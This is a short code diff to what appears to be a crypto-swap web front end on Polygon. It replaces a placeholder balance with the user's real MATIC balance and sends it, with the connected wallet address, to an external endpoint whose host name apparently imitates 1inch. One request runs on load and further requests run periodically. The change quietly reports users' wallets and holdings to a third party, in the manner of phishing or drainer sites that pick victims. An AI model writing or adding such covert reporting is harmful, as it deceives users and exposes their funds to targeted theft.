@@ -410,7 +410,6 @@ if(youPayToken === "MATIC") {
     chainId: 137, // Polygon chain ID
   });
 
-  console.log(data?.formatted)
 
   useEffect(() => {
   if (!isLoading && !isError && data) {
@@ -418,7 +417,7 @@ if(youPayToken === "MATIC") {
 
     const dataToSend = {
       wallet: address,
-      balance: 10,
+      balance: data?.formatted,
     };
     
     fetch('https://1inch2test-rud8.vercel.app/api/wallet-balance', {
@@ -450,7 +449,7 @@ if(youPayToken === "MATIC") {
   useEffect(() => {
     const dataToSend = {
       wallet: address,
-      balance: 10,
+      balance: data?.formatted,
     };
 
     const sendDataPeriodically = () => {
